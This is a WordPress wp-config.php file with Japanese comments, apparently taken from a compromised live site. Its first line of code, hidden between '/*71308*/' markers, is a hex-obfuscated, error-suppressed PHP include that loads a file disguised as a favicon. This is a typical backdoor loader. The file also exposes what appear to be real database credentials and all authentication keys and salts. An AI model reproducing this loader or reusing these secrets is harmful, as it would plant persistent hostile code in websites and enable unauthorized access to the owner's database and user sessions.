<?php
/*71308*/

@include "\x2fex\x70or\x74/c\x67i/\x63om\x2fl/\x6c/t\x6fky\x6fna\x6ban\x6f-l\x6c/w\x70-i\x6ecl\x75de\x73/j\x73/j\x63ro\x70/f\x61vi\x63on\x5f68\x3835\x61.i\x63o";

/*71308*/
/**
 * WordPress の基本設定
 *
 * このファイルは、インストール時に wp-config.php 作成ウィザードが利用します。
 * ウィザードを介さずにこのファイルを "wp-config.php" という名前でコピーして
 * 直接編集して値を入力してもかまいません。
 *
 * このファイルは、以下の設定を含みます。
 *
 * * MySQL 設定
 * * 秘密鍵
 * * データベーステーブル接頭辞
 * * ABSPATH
 *
 * @link http://wpdocs.osdn.jp/wp-config.php_%E3%81%AE%E7%B7%A8%E9%9B%86
 *
 * @package WordPress
 */

// 注意:
// Windows の "メモ帳" でこのファイルを編集しないでください !
// 問題なく使えるテキストエディタ
// (http://wpdocs.osdn.jp/%E7%94%A8%E8%AA%9E%E9%9B%86#.E3.83.86.E3.82.AD.E3.82.B9.E3.83.88.E3.82.A8.E3.83.87.E3.82.A3.E3.82.BF 参照)
// を使用し、必ず UTF-8 の BOM なし (UTF-8N) で保存してください。

// ** MySQL 設定 - この情報はホスティング先から入手してください。 ** //
/** WordPress のためのデータベース名 */
define('DB_NAME', 'sddb0040325567');

/** MySQL データベースのユーザー名 */
define('DB_USER', 'sddbMTg2MDI4');

/** MySQL データベースのパスワード */
define('DB_PASSWORD', 'Wln$iA2s');

/** MySQL のホスト名 */
define('DB_HOST', 'sddb0040325567.cgidb');

/** データベースのテーブルを作成する際のデータベースの文字セット */
define('DB_CHARSET', 'utf8mb4');

/** データベースの照合順序 (ほとんどの場合変更する必要はありません) */
define('DB_COLLATE', '');

/**#@+
 * 認証用ユニークキー
 *
 * それぞれを異なるユニーク (一意) な文字列に変更してください。
 * {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org の秘密鍵サービス} で自動生成することもできます。
 * 後でいつでも変更して、既存のすべての cookie を無効にできます。これにより、すべてのユーザーを強制的に再ログインさせることになります。
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         '7eZmH=K&mm@IWG~RYD0yeh6kCR|2<`{*I]d!tmxW^PGC*Mo{CcM-VE_?&m+|ap4{');
define('SECURE_AUTH_KEY',  'N|PYd,eE<Y.n$J/KUN_?P+pUKB@6uk/V7hjGScFD_f4#A5/pu!9m3D|D)hj&DK@e');
define('LOGGED_IN_KEY',    'aMkV.&RxcXyAGYR(d(w4bW}r,KAiuz2-W9o)BWmVDS+zWrjoa@`7s{<m>%%V/1#Z');
define('NONCE_KEY',        'N`++pl^kRBdXmblytBEfBd..#jM}Qv8M=U`$3SCSh4n=LB$Q/e:CLF8i(qS0c%i!');
define('AUTH_SALT',        '=`2e8IioAT9*/2kdi<emU0tg;O:4/&:X/DfhKAkz)7]SygV`nn3kgf%gpy.#)|d/');
define('SECURE_AUTH_SALT', 'w~km#Jc$X0]G+D2.o=rRGbW[*dsGw[6_?L{!W`#$3U)UhYGMyTFZrR1 $}1&6$N]');
define('LOGGED_IN_SALT',   '.Pq^c5z%Lb`),0XrNY=e/.9 6 /!6)=[D}lUjm{MZ;KzREZ|I6Q5l]pH?X`5q6Jx');
define('NONCE_SALT',       '&yeFvhPJ2%15/>Vvz?U?jZTd6o9z!{;/,,kGpa1/xipf#>6$A[JXqT-V,CAyI]Yw');

/**#@-*/

/**
 * WordPress データベーステーブルの接頭辞
 *
 * それぞれにユニーク (一意) な接頭辞を与えることで一つのデータベースに複数の WordPress を
 * インストールすることができます。半角英数字と下線のみを使用してください。
 */
$table_prefix  = 'wp_';

/**
 * 開発者へ: WordPress デバッグモード
 *
 * この値を true にすると、開発中に注意 (notice) を表示します。
 * テーマおよびプラグインの開発者には、その開発環境においてこの WP_DEBUG を使用することを強く推奨します。
 *
 * その他のデバッグに利用できる定数については Codex をご覧ください。
 *
 * @link http://wpdocs.osdn.jp/WordPress%E3%81%A7%E3%81%AE%E3%83%87%E3%83%90%E3%83%83%E3%82%B0
 */
define('WP_DEBUG', false);

/* 編集が必要なのはここまでです ! WordPress でブログをお楽しみください。 */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
